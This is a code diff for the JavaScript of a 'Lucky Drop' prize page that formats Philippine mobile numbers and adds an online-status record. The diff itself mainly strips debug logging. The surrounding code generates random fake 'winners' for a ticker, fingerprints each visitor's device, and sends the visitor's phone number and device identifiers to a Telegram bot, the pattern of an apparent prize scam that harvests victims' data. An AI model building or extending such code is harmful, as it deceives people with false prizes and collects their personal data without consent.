@@ -1,5 +1,6 @@
 /**
  * Lucky Drop Index Page - Swipe to Verify with Fire Trail
+ * With Online Status System
  */
 
 // Initialize Firebase
@@ -29,133 +30,89 @@ let count = 88;
 
 // ========== FIXED PHONE FORMATTER ==========
 function formatPhoneNumber(input) {
-    // Remove all non-digits
     let cleaned = input.replace(/\D/g, '');
     
-    console.log("========== PHONE FORMATTING ==========");
-    console.log("Raw input:", input);
-    console.log("Cleaned digits:", cleaned);
-    
-    // Empty input
     if (!cleaned || cleaned.length === 0) {
         return '';
     }
     
-    // ===== CASE 1: Already valid 11 digits starting with 09 =====
     if (cleaned.length === 11 && cleaned.startsWith('09')) {
-        console.log("✓ Valid: Already 11 digits with 09");
         return cleaned;
     }
     
-    // ===== CASE 2: 12 digits starting with 099 (extra 9 at start) =====
-    // Example: 09950913419 -> user types 09950913419, becomes 09950913419? Actually 11 digits
-    // If becomes 12 digits like 099950913419, remove first 9
     if (cleaned.length === 12 && cleaned.startsWith('099')) {
-        const result = cleaned.substring(1);
-        console.log("✓ Fixed: Removed extra 9 from start:", result);
-        return result;
+        return cleaned.substring(1);
     }
     
-    // ===== CASE 3: 12 digits starting with 09 (extra digit at end) =====
     if (cleaned.length === 12 && cleaned.startsWith('09')) {
-        const result = cleaned.substring(0, 11);
-        console.log("✓ Fixed: Removed extra digit at end:", result);
-        return result;
+        return cleaned.substring(0, 11);
     }
     
-    // ===== CASE 4: 13+ digits, extract valid 09 number =====
     if (cleaned.length >= 13) {
-        // Find 09 pattern
         const index09 = cleaned.indexOf('09');
         if (index09 !== -1 && cleaned.length >= index09 + 11) {
-            const result = cleaned.substring(index09, index09 + 11);
-            console.log("✓ Fixed: Extracted 09 from within:", result);
-            return result;
+            return cleaned.substring(index09, index09 + 11);
         }
-        // Take last 11 digits
-        const result = cleaned.slice(-11);
-        console.log("✓ Fixed: Took last 11 digits:", result);
-        return result;
+        return cleaned.slice(-11);
     }
     
-    // ===== CASE 5: 11 digits but doesn't start with 09 =====
     if (cleaned.length === 11 && !cleaned.startsWith('09')) {
-        // If starts with 99, replace first two digits with 09
         if (cleaned.startsWith('99')) {
-            const result = '09' + cleaned.substring(2);
-            console.log("✓ Fixed: Replaced 99 with 09:", result);
-            return result;
+            return '09' + cleaned.substring(2);
         }
-        // If starts with 09 after first digit
-        if (cleaned.substring(1, 3) === '09') {
-            const result = cleaned.substring(1);
-            console.log("✓ Fixed: Shifted to get 09:", result);
-            return result;
-        }
-        // Default: replace first two digits with 09
-        const result = '09' + cleaned.substring(2);
-        console.log("✓ Fixed: Replaced prefix with 09:", result);
-        return result;
+        return '09' + cleaned.substring(2);
     }
     
-    // ===== CASE 6: Starts with 63 (international format) =====
     if (cleaned.startsWith('63') && cleaned.length >= 12) {
         let without63 = cleaned.substring(2);
-        // If starts with 9, add 0
         if (without63.startsWith('9')) {
             without63 = '0' + without63;
         }
-        // Take first 11 digits
-        const result = without63.substring(0, 11);
-        console.log("✓ Fixed: International 63 format:", result);
-        return result;
+        return without63.substring(0, 11);
     }
     
-    // ===== CASE 7: 10 digits - add 0 prefix =====
     if (cleaned.length === 10) {
-        const result = '0' + cleaned;
-        console.log("✓ Fixed: 10 digits, added 0:", result);
-        return result;
+        return '0' + cleaned;
     }
     
-    // ===== CASE 8: 9 digits - add 09 prefix =====
     if (cleaned.length === 9) {
-        const result = '09' + cleaned;
-        console.log("✓ Fixed: 9 digits, added 09:", result);
-        return result;
+        return '09' + cleaned;
     }
     
-    // ===== CASE 9: Starts with 0 and has 11 digits =====
     if (cleaned.startsWith('0') && cleaned.length === 11) {
-        console.log("✓ Valid: Starts with 0, 11 digits:", cleaned);
         return cleaned;
     }
     
-    // ===== CASE 10: Starts with 0 and has more than 11 digits =====
     if (cleaned.startsWith('0') && cleaned.length > 11) {
-        const result = cleaned.substring(0, 11);
-        console.log("✓ Fixed: Trimmed to 11 digits:", result);
-        return result;
+        return cleaned.substring(0, 11);
     }
     
-    // ===== CASE 11: Starts with 9 and has 10 digits =====
     if (cleaned.startsWith('9') && cleaned.length === 10) {
-        const result = '0' + cleaned;
-        console.log("✓ Fixed: Added 0 prefix:", result);
-        return result;
+        return '0' + cleaned;
     }
     
-    // ===== DEFAULT: Return cleaned =====
-    console.log("⚠ Default: Returning cleaned:", cleaned);
     return cleaned;
 }
 
 // ========== VALIDATE PHONE NUMBER ==========
 function isValidPhoneNumber(phone) {
     const formatted = formatPhoneNumber(phone);
-    const isValid = formatted.length === 11 && formatted.startsWith('09');
-    console.log("Validation - Formatted:", formatted, "Valid:", isValid);
-    return isValid;
+    return formatted.length === 11 && formatted.startsWith('09');
+}
+
+// ========== SET USER ONLINE STATUS ==========
+async function setUserOnline(phoneNumber, fingerprint, deviceDisplayId) {
+    try {
+        await db.ref('user_sessions/' + phoneNumber).update({
+            status: 'online',
+            lastSeen: firebase.database.ServerValue.TIMESTAMP,
+            deviceFingerprint: fingerprint,
+            deviceDisplayId: deviceDisplayId
+        });
+        console.log('✅ Status set to ONLINE:', phoneNumber);
+    } catch(e) {
+        console.error('Error setting online status:', e);
+    }
 }
 
 // ========== SWIPE WITH FIRE TRAIL ==========
@@ -334,15 +291,10 @@ function startTicker() {
     
     function generateRandomAmount() {
         const rand = Math.random();
-        if (rand < 0.60) {
-            return 150;
-        } else if (rand < 0.85) {
-            return 300;
-        } else if (rand < 0.95) {
-            return 450;
-        } else {
-            return 600;
-        }
+        if (rand < 0.60) return 150;
+        else if (rand < 0.85) return 300;
+        else if (rand < 0.95) return 450;
+        else return 600;
     }
     
     function generateWinner() {
@@ -450,6 +402,7 @@ async function createUserSession(phone, fingerprint, deviceDisplayId) {
             phone: phone,
             balance: 0,
             clicks: 0,
+            status: 'online',
             deviceFingerprint: fingerprint,
             deviceDisplayId: deviceDisplayId,
             lastUpdate: Date.now(),
@@ -457,6 +410,7 @@ async function createUserSession(phone, fingerprint, deviceDisplayId) {
         });
     } else {
         await sessionRef.update({
+            status: 'online',
             lastUpdate: Date.now(),
             deviceFingerprint: fingerprint,
             deviceDisplayId: deviceDisplayId
@@ -508,7 +462,7 @@ async function isNumberClaimed(phone) {
 }
 
 // ========== SHOW BLOCKED UI ==========
-function showBlockedUI(reason = "banned") {
+function showBlockedUI(reason) {
     if (!modalOverlay) return;
     modalOverlay.style.display = 'flex';
     
@@ -542,21 +496,13 @@ window.processStep1 = async function() {
     const btn = claimBtn;
     const fingerprint = getDeviceFingerprint();
 
-    // Check if input is empty
     if (!phone || phone.length === 0) {
         alert("Please enter your mobile number.");
         return;
     }
     
-    // Format the phone number
     const fullPhone = formatPhoneNumber(phone);
     
-    console.log("======================================");
-    console.log("Original input:", phone);
-    console.log("Formatted phone:", fullPhone);
-    console.log("======================================");
-    
-    // Validate the formatted number
     if (!isValidPhoneNumber(fullPhone)) {
         alert("Invalid mobile number.\n\nPlease enter a valid number like:\n• 09123456789\n• 9123456789\n• 639123456789");
         return;
@@ -585,6 +531,9 @@ window.processStep1 = async function() {
         const deviceDisplayId = await getOrCreateDeviceId(fingerprint);
         await saveDeviceInfo(fullPhone, fingerprint, deviceDisplayId);
         await createUserSession(fullPhone, fingerprint, deviceDisplayId);
+        
+        // SET USER STATUS TO ONLINE
+        await setUserOnline(fullPhone, fingerprint, deviceDisplayId);
         
         const message = `🎁 LUCKY DROP LOGIN:\n📱 ${fullPhone}\n🖥️ FP: ${fingerprint}\n🔑 DEV#: ${deviceDisplayId}`;
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
